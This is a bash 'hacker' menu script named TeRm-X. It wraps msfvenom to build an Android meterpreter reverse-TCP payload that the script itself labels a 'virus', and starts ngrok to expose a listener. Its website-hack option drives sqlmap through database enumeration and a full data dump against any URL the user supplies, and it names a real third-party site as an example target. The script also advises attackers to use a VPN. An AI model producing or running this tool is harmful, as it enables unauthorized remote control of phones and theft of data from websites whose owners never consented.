#!/bin/bash
tput setaf 2
figlet TeRm-X
while [ 1 ]
do
	echo "=============================="
	echo "scripted by sachin anon hacker"
	echo "=============================="
	echo "1 - update and upgrade"
	echo "2 - create raw payload"
	echo "3 - start ngrok"
	echo "4 - website hack"
	echo "5 - exit"
	echo -n "make select your option :- "
	read selection
	
	if [ $selection -eq 1 ]
	then
		apt-get update -y
		apt-get upgrade -y
	elif [ $selection -eq 2 ]
	then
		echo -n "type lhost :-"
		read lhost
		echo -n "type lport :-"
		read lport
		echo -n "virus name :-"
		read name
		cd $HOME
		cd metasploit-framework
		./msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> /sdcard/$name
		sleep 1
		echo "Go and check your storage"
		sleep 1
		figlet Done...
		cd Term-X
	elif [ $selection -eq 3 ]
	then
		cd $HOME
		echo -n "Type http or tcp :-"
		read ht
		echo -n "Type port :- "
		read port
		./ngrok $ht $port
	elif [ $selection -eq 4 ]
	then
		clear
		cd $HOME
		figlet Website hack
		scripted by sachin mmct
		sleep 2
		echo " USE THIS TOOL ON YOUR OWN RISK>>>..."
		sleep 2
		echo "Find vulnarable websites"
		sleep 2
		echo "Example website = http://www.bible-history.com/subcat.php?id=1"
		sleep 2
		cd sqlmap
		echo "Enter your targeted website"
		read sachin
		python2 sqlmap.py -u $sachin --dbs
		echo "Select your database"
		read data
		python2 sqlmap.py -u $sachin -D $data --tables
		echo "Select tables"
		read table
		python2 sqlmap.py -u $sachin -D $data -T $table --columns
		echo "Select columns"
		read column
		python2 sqlmap.py -u $sachin -D $data -T $table -C $column --dump
		sleep 1
		figlet Done ....
		sleep 1
		echo "successfully hacked this website"
		sleep 1
		echo "you may get into the jail "
		echo " dont hack govt website "
		echo "use vpn before attacking"
                cd $HOME/Term-X
	elif [ $selection -eq 5 ]
	then
		echo "bye tata"
		break
	else
		echo "wrong selection"
	fi
	
	echo "press enter to continue :"
	read x
	clear
done
